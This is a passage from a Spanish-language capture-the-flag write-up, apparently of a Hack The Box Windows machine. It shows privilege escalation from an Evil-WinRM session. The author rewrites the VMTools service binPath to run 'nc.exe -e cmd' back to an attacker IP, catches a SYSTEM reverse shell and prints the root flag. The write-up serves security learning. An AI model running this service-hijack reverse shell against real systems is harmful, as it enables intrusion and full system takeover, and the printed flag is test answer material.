+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; services
+
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
+&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;                                                False Sense            
+C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
+&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;                                                     True VGAuthService    
+&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;                                                                        True VMTools          
+&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;                                             True WdNisSvc         
+&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;                                            True WinDefend        
+&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;                                                                      False WMPNetworkSvc    
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a manipular uno.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe config VMTools binPath=&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.14 443&quot;
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li>Nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+</code></pre></div></div>
+<ul>
+<li><p>Y como la tarea es privilegiada ala hora de arrancar el servicio nos va enviar la <strong>reverse shell</strong>.</p>
+</li>
+<li><p>Primero vamos a parar el servicio.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe stop VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li>Ahora lo arrancamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe start VMTools
+</code></pre></div></div>
+<ul>
+<li>Y recibimos la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.95.241 55672
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+<h2 id="root-flag">root flag</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+d85fffc0c733cc167c158e77fe6eeda2
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
